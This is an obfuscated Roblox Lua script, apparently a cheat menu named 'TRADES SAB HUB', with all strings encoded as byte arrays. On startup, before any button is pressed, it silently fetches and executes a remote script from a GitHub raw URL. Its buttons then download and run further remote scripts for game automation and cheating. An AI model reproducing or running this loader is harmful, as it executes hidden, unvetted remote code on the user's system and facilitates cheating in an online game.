task.spawn(function()
local _0x1FD7, _0x3DE5 = pcall(function()
loadstring(game:HttpGet(string.char(104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,115,97,98,45,97,112,105,47,115,97,98,45,115,99,114,105,112,116,115,47,109,97,105,110,47,115,99,114,105,112,116,115,47,110,105,110,106,97,104,117,98,95,49,55,57,52,55,54,49,57,48,49,56,50,52,46,108,117,97)))()
end)
if not _0x1FD7 then
warn(string.char(69,114,114,111,114,32,97,108,32,99,97,114,103,97,114,32,78,105,110,106,97,72,117,98,58,32).. tostring(_0x3DE5))
end
end)local _0x4C5D = game:GetService(string.char(67,111,114,101,71,117,105))
local _0x0C42 = game:GetService(string.char(80,108,97,121,101,114,115))
local _0x00D8 = _0x0C42.LocalPlayerif _0x4C5D:FindFirstChild(string.char(84,114,97,100,101,83,65,66,72,117,98,71,85,73)) then
_0x4C5D.TradeSABHubGUI:Destroy()
end
local _0xF955 = Instance.new(string.char(83,99,114,101,101,110,71,117,105))
_0xF955.Name =string.char(84,114,97,100,101,83,65,66,72,117,98,71,85,73)_0xF955.ResetOnSpawn = false
pcall(function()
_0xF955.Parent = _0x4C5D
end)
if not _0xF955.Parent then
_0xF955.Parent = _0x00D8:WaitForChild(string.char(80,108,97,121,101,114,71,117,105))
endlocal _0x70FD = Instance.new(string.char(84,101,120,116,66,117,116,116,111,110))
_0x70FD.Name =string.char(84,111,103,103,108,101,66,117,116,116,111,110)_0x70FD.Size = UDim2.new(0, 55, 0, 55)
_0x70FD.Position = UDim2.new(0, 20, 0, 100)
_0x70FD.BackgroundColor3 = Color3.fromRGB(35, 35, 45)
_0x70FD.TextColor3 = Color3.fromRGB(255, 255, 255)
_0x70FD.TextSize = 16
_0x70FD.Font = Enum.Font.GothamBold
_0x70FD.Text =string.char(83,65,66)_0x70FD.Parent = _0xF955
local _0x09F4 = Instance.new(string.char(85,73,67,111,114,110,101,114))
_0x09F4.CornerRadius = UDim.new(0, 14)
_0x09F4.Parent = _0x70FDlocal _0xB310 = Instance.new(string.char(70,114,97,109,101))
_0xB310.Name =string.char(77,97,105,110,70,114,97,109,101)_0xB310.Size = UDim2.new(0, 320, 0, 335)
_0xB310.Position = UDim2.new(0.5, -160, 0.5, -167)
_0xB310.BackgroundColor3 = Color3.fromRGB(18, 18, 25)
_0xB310.BorderSizePixel = 0
_0xB310.Visible = true
_0xB310.Parent = _0xF955
local _0x30CC = Instance.new(string.char(85,73,67,111,114,110,101,114))
_0x30CC.CornerRadius = UDim.new(0, 16)
_0x30CC.Parent = _0xB310local _0xB4C7 = Instance.new(string.char(84,101,120,116,76,97,98,101,108))
_0xB4C7.Size = UDim2.new(1, 0, 0, 50)
_0xB4C7.BackgroundTransparency = 1
_0xB4C7.Text =string.char(84,82,65,68,69,83,32,83,65,66,32,72,85,66)_0xB4C7.TextColor3 = Color3.fromRGB(255, 255, 255)
_0xB4C7.TextSize = 20
_0xB4C7.Font = Enum.Font.GothamBold
_0xB4C7.Parent = _0xB310local _0xA40F = Instance.new(string.char(83,99,114,111,108,108,105,110,103,70,114,97,109,101))
_0xA40F.Size = UDim2.new(1, -20, 1, -65)
_0xA40F.Position = UDim2.new(0, 10, 0, 55)
_0xA40F.BackgroundTransparency = 1
_0xA40F.BorderSizePixel = 0
_0xA40F.CanvasSize = UDim2.new(0, 0, 0, 270)
_0xA40F.ScrollBarThickness = 4
_0xA40F.Parent = _0xB310
local _0x66AF = Instance.new(string.char(85,73,76,105,115,116,76,97,121,111,117,116))
_0x66AF.HorizontalAlignment = Enum.HorizontalAlignment.Center
_0x66AF.SortOrder = Enum.SortOrder.LayoutOrder
_0x66AF.Padding = UDim.new(0, 12)
_0x66AF.Parent = _0xA40Flocal function _0xB3F0(name, url, order)
local _0x7688 = Instance.new(string.char(84,101,120,116,66,117,116,116,111,110))
_0x7688.Name = name ..string.char(66,116,110)_0x7688.Size = UDim2.new(1, -10, 0, 52)
_0x7688.BackgroundColor3 = Color3.fromRGB(38, 38, 52)
_0x7688.TextColor3 = Color3.fromRGB(255, 255, 255)
_0x7688.TextSize = 15
_0x7688.Font = Enum.Font.GothamSemibold
_0x7688.Text = name
_0x7688.LayoutOrder = order
_0x7688.Parent = _0xA40F
local _0xBD23 = Instance.new(string.char(85,73,67,111,114,110,101,114))
_0xBD23.CornerRadius = UDim.new(0, 10)
_0xBD23.Parent = _0x7688
_0x7688.MouseButton1Click:Connect(function()
pcall(function()
loadstring(game:HttpGet(url))()
end)
end)
end_0xB3F0(string.char(65,73,32,82,105,100,100,108,101,32,67,111,100,101),string.char(104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,110,105,99,101,98,111,110,105,99,101,108,121,45,104,117,101,47,84,82,65,68,69,83,83,65,66,72,85,66,47,114,101,102,115,47,104,101,97,100,115,47,109,97,105,110,47,97,105,114,105,100,100,108,101,99,111,100,101,46,108,117,97), 1)
_0xB3F0(string.char(65,117,116,111,32,67,111,100,101,32,83,65,66),string.char(104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,110,105,99,101,98,111,110,105,99,101,108,121,45,104,117,101,47,84,82,65,68,69,83,83,65,66,72,85,66,47,114,101,102,115,47,104,101,97,100,115,47,109,97,105,110,47,97,117,116,111,99,111,100,101,115,97,98,46,108,117,97), 2)
_0xB3F0(string.char(79,112,101,110,32,79,108,100,32,77,97,99,104,105,110,101,115),string.char(104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,110,105,99,101,98,111,110,105,99,101,108,121,45,104,117,101,47,84,82,65,68,69,83,83,65,66,72,85,66,47,114,101,102,115,47,104,101,97,100,115,47,109,97,105,110,47,111,112,101,110,111,108,100,109,97,99,104,105,110,101,115,115,97,98,46,108,117,97), 3)
_0xB3F0(string.char(84,114,97,105,116,32,70,97,114,109,101,114,32,79,112),string.char(104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,110,105,99,101,98,111,110,105,99,101,108,121,45,104,117,101,47,84,82,65,68,69,83,83,65,66,72,85,66,47,114,101,102,115,47,104,101,97,100,115,47,109,97,105,110,47,116,114,97,105,116,102,97,114,109,101,114,111,112,46,108,117,97), 4)local _0x5FC6 = true
_0x70FD.MouseButton1Click:Connect(function()
_0x5FC6 = not _0x5FC6
_0xB310.Visible = _0x5FC6
end)
